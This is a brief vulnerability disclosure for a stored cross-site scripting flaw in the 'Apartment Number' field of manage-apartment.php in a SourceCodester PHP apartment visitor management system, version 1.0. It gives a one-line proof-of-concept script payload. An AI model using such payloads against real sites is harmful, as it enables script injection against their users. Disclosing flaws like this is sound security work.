# Apartment Visitor Management System-XSS

### Date: 

> ### 2022-08/06



### Exploit Author:

> ### anx0ing@gmail.com



### Vendor Homepage: 

> [https://www.sourcecodester.com](https://www.sourcecodester.com/)



### Software Link: 

> https://www.sourcecodester.com/php-apartment-visitor-management-system-source-code



### Version: 

> ### 1.0



### /manage-apartment.php

in Add New Entry insert Cross Site Scripting(XSS) Code

`Apartment Number`Parameters have Cross Site Scripting(XSS)

> POC

```
<script>alert(1)</script>
```

![image-20220806002250606](https://cdn.jsdelivr.net/gh/beytagh001/blog-img/image-20220806002250606.png)



